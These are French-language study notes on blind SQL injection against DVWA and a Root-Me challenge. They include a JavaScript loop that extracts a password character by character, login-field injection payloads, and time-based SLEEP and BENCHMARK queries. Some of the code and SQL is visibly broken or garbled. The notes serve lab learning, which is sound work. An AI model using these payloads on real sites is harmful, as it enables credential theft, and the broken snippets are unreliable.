# SQL Injection (Blind)


Exemple de boucle pour récupérer et tester toute les valeurs sur tous les caractères du mot de passe.

[Rappel : "abcdef0123456789" est le format hexadécimal !](https://sti2d.ecolelamache.org/ii_lhexadcimal.html)


```javascript
let idUser = 1;
let lettersPwd = [];

console.log("Recupération du MDP en cours ....");

"abcdef0123456789".split("").forEach((letter) => {
    for(i=1; i<=32;i++) {
        testLetter(letter, i);
    }
}
);

function testLetter(letter, position) {

    let injection = `${idUser}' AND substr( password , ${position}, 1) LIKE '${letter}' -- -`;
    fetch(`http://localhost:81/vulnerabilities/sqli_blind/?Submit=Submit&id=${injection}`).then( (response) => {
        if(response.ok) lettersPwd[position-1] = letter;
        if(lettersPwd.join('').length == 32) console.info(`le mdp : ${lettersPwd.join('')}`) 
    } );

}

```


### [SQL Injection - En aveugle](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-en-aveugle?lang=fr)

![Exercice](assets/picture/exercices_root_me_sql_injection_authentification_v0.02.png)

Dans cette exercice on remarque un formulaire avec action null ou cachée, avec 2 input (login, password) avec un submit.

J'aimerais lire le fichier index.php pour comprendre l'utilisation de la requête SQL 

Erreur php en hexa :
Erreur : + <?php echo(;>
Hexa : 3C3F706870206563686F283B3F3E


Login : "admin"
Password : " '3C3F706870206563686F283B3F3E

```php
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "3C3F706870206563686F283B3F3E" in /challenge/web-serveur/ch10/index.php on line 39
```

On peut verifier l'id

Login : admin' -- a
Password : 12345

```
Your informations :
- username : admin


Hi master ! To validate the challenge use this password

```

On va tester la longueur du password

Login : admin' AND LENGTH(password) > 1 -- a
Password : 12345

Testé jusqu'a 8 ou c'est une erreur, le mot de passe comporte bien 8 caractères

Login : admin' AND LENGTH(password) = 8 -- a
Password : 12345

On va tester tout les caractères

Login : admin' AND LEFT(password, 1) = 'a' -- a
Password : 12345

Login : admin' AND LOCATE('a',password, 1)  -- a
Password : 12345

Login : admin' AND substr( password , 1, 1) LIKE 'd' -- a
Password : 12345


Bon on va adapter notre premier script de brut force

```javascript
let idUser = 1;
let login = "admin";
let passwordLength = 8;
let lettersPwd = [];
let hexa = "abcdef0123456789";

for (i=1; i<passwordLenght*hexa.length(); i++){
    $('input').attr('name', 'username').value = `admin' AND substr( password , ${position[i]}, ${position + 1}) LIKE '${caracs[i]}' -- a`
}

console.log("Recupération du MDP en cours ....");

"abcdefghijklmnoparstuvwxyzABCDEFGHIJKLMNOPARSTUVWXYZ0123456789".split("").forEach((letter) => {
    for(i=1; i<=32;i++) {
        testLetter(letter, i);
    }
}
);
"abcdef0123456789".split("").forEach((letter) => {
    for(i=1; i<=32;i++) {
        testLetter(letter, i);
    }
}
);

function testLetter(letter, position) {

    let newInjection = encodeURI(`admin'AND substr(password, ${position}, 1 )=${letter} -- -`);
    fetch(`https://challenge01.root-me.org/web-serveur/ch10/`, {
        method: 'POST',
        headers : {"content-type":"application/x-www-form-urlencoded"}
    })
    let injection = `${idUser}' AND substr( password , ${position}, 1) LIKE '${letter}' -- -`;
    fetch(`http://challenge01.root-me.org/web-serveur/ch10/?Submit=Submit&id=${injection}`).then( (response) => {
        if(response.ok) lettersPwd[position-1] = letter;
        if(lettersPwd.join('').length == 32) console.info(`le mdp : ${lettersPwd.join('')}`) 
    } );

}

```

Attention : Fonction Sleep permet d'endormir l'execution du script.

Retour sur DVWA

```SQL
1' AND (SELECT SLEEP(5)
    FROM users
    WHERE user = "admin"
    AND LENGTH(password) = 32
    ) -- -

```

BenchMark : Par exemple avec 3 language de programmation, on va executé le meme script sur les différents languages pour définir le plus rapide.

SQK BecnhMark

ENCHMARK(LOOP, STATEMENT)

```SQL 
1' 1' AND (SELECT BENCHMARK(50000, MD5("toto"))
    FROM users
    WHERE user = "admin"
    AND BENCKMARK(1000, ) = 32
    ) -- -
```